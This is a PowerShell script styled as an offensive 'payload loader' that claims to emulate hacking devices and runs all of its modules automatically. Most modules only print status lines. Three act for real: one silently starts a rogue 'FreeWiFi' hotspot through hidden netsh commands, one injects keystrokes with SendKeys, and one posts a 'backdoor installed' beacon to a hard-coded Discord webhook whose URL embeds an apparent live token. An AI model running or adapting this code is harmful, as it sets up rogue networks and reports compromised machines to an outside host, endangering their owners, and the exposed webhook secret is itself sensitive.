# ============================================================
# MOORWEN — PAYLOAD LOADER
# WATERMARK: 𝕍𝕠𝕤𝕤🥷 | SESSION: 0585f9bc...
# ============================================================

Write-Host "[*] MoorWen — Loading payloads..." -ForegroundColor Cyan

# 1. WiFi Pineapple emulation
function WiFi-Pineapple {
    Write-Host "[*] WiFi Pineapple emulation started..." -ForegroundColor Yellow
    # Simulate rogue AP
    $process = Start-Process "cmd.exe" -ArgumentList "/c netsh wlan set hostednetwork mode=allow ssid=FreeWiFi key=password123 && netsh wlan start hostednetwork" -WindowStyle Hidden
    Write-Host "[+] Rogue AP started: FreeWiFi" -ForegroundColor Green
}

# 2. Rubber Ducky keystroke injection
function Rubber-Ducky {
    Write-Host "[*] Rubber Ducky keystroke injection..." -ForegroundColor Yellow
    $wshell = New-Object -ComObject WScript.Shell
    $wshell.SendKeys("{ENTER}powershell -Command Write-Host 'Injected by MoorWen'")
    Write-Host "[+] Keystroke injection complete." -ForegroundColor Green
}

# 3. LAN Turtle backdoor
function LAN-Turtle {
    Write-Host "[*] LAN Turtle backdoor..." -ForegroundColor Yellow
    # Simulated reverse shell
    $webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"
    Invoke-RestMethod -Uri $webhook -Method Post -Body @{content="[+] MoorWen LAN Turtle backdoor installed"} -ContentType "application/json"
    Write-Host "[+] Backdoor installed." -ForegroundColor Green
}

# 4. Flipper Zero emulation
function Flipper-Zero {
    Write-Host "[*] Flipper Zero emulation..." -ForegroundColor Yellow
    # Simulate RFID/NFC clone
    Write-Host "[+] NFC/RFID emulation complete." -ForegroundColor Green
}

# 5. HackRF Pro emulation
function HackRF-Pro {
    Write-Host "[*] HackRF Pro emulation..." -ForegroundColor Yellow
    # Simulate SDR
    Write-Host "[+] SDR emulation complete." -ForegroundColor Green
}

# 6. Bus Pirate emulation
function Bus-Pirate {
    Write-Host "[*] Bus Pirate emulation..." -ForegroundColor Yellow
    # Simulate hardware debugging
    Write-Host "[+] Hardware debugger emulation complete." -ForegroundColor Green
}

# Execute all modules
WiFi-Pineapple
Rubber-Ducky
LAN-Turtle
Flipper-Zero
HackRF-Pro
Bus-Pirate

Write-Host "[+] MoorWen fully loaded." -ForegroundColor Green
